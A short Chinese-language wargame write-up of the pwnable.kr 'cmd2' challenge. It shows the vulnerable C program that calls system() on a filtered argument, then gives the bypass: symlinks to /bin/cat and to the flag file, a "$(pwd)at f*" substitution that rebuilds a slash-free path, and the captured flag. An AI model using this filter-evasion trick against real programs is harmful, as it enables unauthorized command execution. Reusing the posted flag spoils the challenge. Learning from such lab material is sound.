# pwnable.kr--4

1.cmd2

```c 
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

字符串过滤了 ‘/’ 

大神指出了通过pwd指令来构造‘/’的方法

首先在/tmp/c。那么，如果在/tmp/c目录下执行pwd命令就可以得到/tmp/c了。然后在/tmp下构造cat的软应用ln -s /bin/cat cat，在/tmp/c下建立flag的软引用ln -s /home/cmd2/flag flag。然后在/tmp/exploit/c下执行命令/home/cmd2/cmd2 "$(pwd)at f*"就可以得到flag了。其原理就是利用“$(pwd)at”构造出/tmp/cat命令。

```

$ cd c
$ /home/cmd2/cmd2 "\$(pwd)at f*"
$(pwd)at f*
FuN_w1th_5h3ll_v4riabl3s_haha

```

